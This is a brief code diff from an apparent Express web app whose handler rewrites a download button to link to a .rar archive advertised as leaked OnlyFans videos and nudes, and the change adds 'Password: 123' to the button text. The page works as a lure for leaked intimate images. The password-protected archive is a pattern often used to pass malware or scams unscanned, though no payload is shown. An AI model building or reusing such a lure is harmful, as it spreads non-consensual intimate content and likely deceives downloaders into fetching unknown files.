@@ -86,7 +86,7 @@ app.get('/', async function (req, res) {
         console.log(buttonDownload.text)
         if (buttonDownload.getAttribute('href') !== undefined){
             buttonDownload.setAttribute('href','https://therabbit.org/ONLYFANS%20LEAKS%20VIDEOS%20AND%20NUDES%20PACKAGE.rar')
-            buttonDownload.innerHTML = "CLICK TO DOWNLOAD VIDEOS & PICS"
+            buttonDownload.innerHTML = "CLICK TO DOWNLOAD VIDEOS & PICS <br/> <strong><i>Password: 123</i></strong>"
         }
         console.log(buttonDownload.text)
     }
